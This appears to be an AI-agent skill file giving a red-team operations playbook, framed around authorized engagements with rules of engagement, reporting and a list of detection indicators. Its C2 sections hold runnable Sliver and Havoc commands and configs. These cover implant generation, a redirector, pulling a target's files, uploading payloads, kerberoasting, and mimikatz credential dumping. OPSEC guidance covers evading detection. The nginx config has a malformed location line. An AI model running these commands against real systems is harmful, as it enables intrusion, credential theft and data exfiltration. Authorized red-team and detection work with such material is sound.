---
name: red-team-operations
description: Red team operations — full scope engagement methodology, phishing, social engineering, C2 infrastructure, OPSEC, reporting
---

# Red Team Operations

## Purpose
Self-contained guide for planning and executing full-scope red team engagements: campaign planning, initial access vectors, C2 infrastructure, OPSEC considerations, and reporting.

## Technique checklist

### 1. Engagement planning
- Rules of engagement (ROE) definition
- Scope boundary documentation (IP ranges, domains, applications)
- Communication plan (deconfliction, emergency contact)
- Timeline and milestone definition
- Legal authorization verification

### 2. Reconnaissance & OSINT
- Corporate structure and employee enumeration
- Email harvesting (theHarvester, Hunter.io)
- Social media profiling (LinkedIn, Twitter)
- DNS / subdomain enumeration
- Technology stack fingerprinting

### 3. Initial access
- Phishing campaigns (spear phishing, whaling, Vishing)
  - Payload delivery: macro-enabled documents, HTA, LNK, ISO
  - Template injection and credential harvesting portals
  - MFA bypass techniques (AiTM proxies, Evilginx, EvilNR)
- Social engineering (pretexting, impersonation, tailgating)
- Physical access (lock picking, badge cloning, dropbox deployment)
- Supply chain compromise vectors

### 4. C2 infrastructure
- Domain fronting and CDN abuse
- Redirector chains (Apache mod_rewrite, Nginx)
- C2 framework selection (Cobalt Strike, Sliver, Havoc, Mythic)
- Implant staging: staged vs stageless payloads
- Profile customization (malleable C2 profiles, jitter, jitter)

#### Sliver Framework Deployment
```bash
# Install Sliver server
curl -sL https://sliver.sh/install | bash

# Start team server (multiplayer mode)
sliver-server daemon --lhost 0.0.0.0 --lport 31337

# Generate HTTPS implant (beacon mode)
generate --http https://redirector.example.com --save /tmp/ --beacon

# Generate DNS implant
generate --dns example.com --save /tmp/ --shellcode

# Listeners
https --domain redirector.example.com --lport 443
dns --domain example.com
mtls --lport 8888
wg --lport 53 --tun-cidr 100.64.0.1/24

# Post-exploitation commands (beacon/session)
beacon ps                          # process listing
beacon execute-assembly /tmp/Seatbelt.exe  # .NET assembly in-memory
beacon sideload /tmp/Priv.exe      # DLL sideloading
beacon pivots                      # list active pivots
beacon armory install situational-awareness  # BOF from Armory
```

#### Havoc Framework Deployment
```yaml
# havoc.yaotl — team server config
Teamserver {
    Host = "0.0.0.0";
    Port = 40056;
    Password = "secure-password";
}
Operators {
    User "operator1" { Password = "op1-pass"; }
}
Listeners {
    Https {
        Name = "https-listener";
        Host = "0.0.0.0";
        Port = 443;
        Secure = true;
        Cert = "/path/to/cert.pem";
        Key  = "/path/to/key.pem";
    }
}
Demon {
    Sleep = 5;
    Jitter = 20;
    KillDate = "2026-12-31";
}
```

```bash
# Demon agent post-exploitation
demon whoami
demon proc list
demon download C:\\Users\\target\\secrets.pdf
demon upload /tmp/payload.exe C:\\temp\\update.exe
demon dotnet inline-execute /tmp/Rubeus.exe kerberoast
demon token steal
demon token rev2self
demon mimikatz coffee privilege::debug sekurlsa::logonpasswords
demon socks start 1080          # SOCKS proxy
demon rportfwd 8080 127.0.0.1 80  # reverse port forward
```

#### NGINX Redirector Config
```nginx
server {
    listen 443 ssl;
    server_name c2.example.com;

    ssl_certificate /etc/ssl/certs/c2.pem;
    ssl_certificate_key /etc/ssl/private/c2.key;

    location / legitimate-path/ {
        proxy_pass https://real-teamserver:8443/;
        proxy_set_header Host $host;
    }

    location / {
        return 301 https://www.example.com/;
    }
}
```

#### OPSEC Considerations Table
| Consideration | Implementation |
|---------------|----------------|
| TLS certificate matches domain | Use Let's Encrypt or purchased cert |
| Beacon jitter 15-30% | Avoid regular interval pattern |
| Working hours only | Restrict implant check-in to business hours |
| User-Agent matching | Profile UA to match target environment |
| DNS beacon frequency | Low frequency (300-600s) to avoid volume alerts |
| Kill date | Set auto-expiry to prevent forgotten implants |
| Egress blending | Use HTTPS/443 or DNS-over-HTTPS |

### 5. OPSEC considerations
- Egress traffic blending (HTTPS over 443, DNS over HTTPS)
- Payload metadata sanitization (timestamps, author fields)
- Infrastructure separation (team server, redirectors, phishing servers)
- Burn plan for compromised infrastructure
- Logging avoidance on target systems

### 6. Post-engagement
- Artifact cleanup and removal
- Detailed reporting with evidence chain
- Findings mapping to MITRE ATT&CK
- Remediation recommendations with priority
- Debrief with blue team (purple team exercise)

## Decision tree

```
Engagement scope defined
├─ External only?
│  ├─ Phishing → Initial access → C2 deployment
│  └─ Exploit public-facing service → Shell → C2
├─ Internal + external?
│  ├─ Physical access attempt → Drop device → Internal pivot
│  └─ Phishing → VPN/RDP access → Internal network
└─ Full scope?
   ├─ Social engineering for physical access
   ├─ Phishing for credential/application access
   └─ Combine all vectors for maximum realism
```

## Tools table

| Tool | Purpose | Stage |
|------|---------|-------|
| Cobalt Strike / Sliver / Havoc | C2 framework | Operations |
| Evilginx2 / EvilNR | AiTM phishing proxy | Initial access |
| Gophish | Phishing campaign management | Initial access |
| theHarvester | Email and subdomain enumeration | Recon |
| GoFindKeys / Rubeus | Credential access | Post-exploitation |
| BloodHound | AD attack path analysis | Post-exploitation |
| Proxychains / Chisel | Tunneling and pivoting | Lateral movement |
| Mythic | Agent-based C2 | Operations |

## Detection indicators
- Phishing email with urgent action request from external sender
- Authentication from unusual geographic location or IP
- New service or scheduled task creation on endpoints
- DNS queries to newly registered domains with low reputation
- Large data egress over standard protocols (HTTPS, DNS)
- Beaconing pattern in network traffic (regular interval connections)
- Sliver mTLS default port 8888 or WireGuard port 53 traffic
- Havoc Demon agent: Ekko sleep via CreateTimerQueueTimer patterns
- DNS TXT record responses with encoded Sliver session data
- HTTP/S requests with Sliver-specific headers (X-Sliver-*)
- Process injection patterns: CreateRemoteThread + VirtualAllocEx + WriteProcessMemory
- .NET assembly load via Assembly.Load in suspicious process context
- SOCKS proxy or reverse port forward from unknown process
- Beacon check-in pattern: GET request followed by large POST at regular intervals
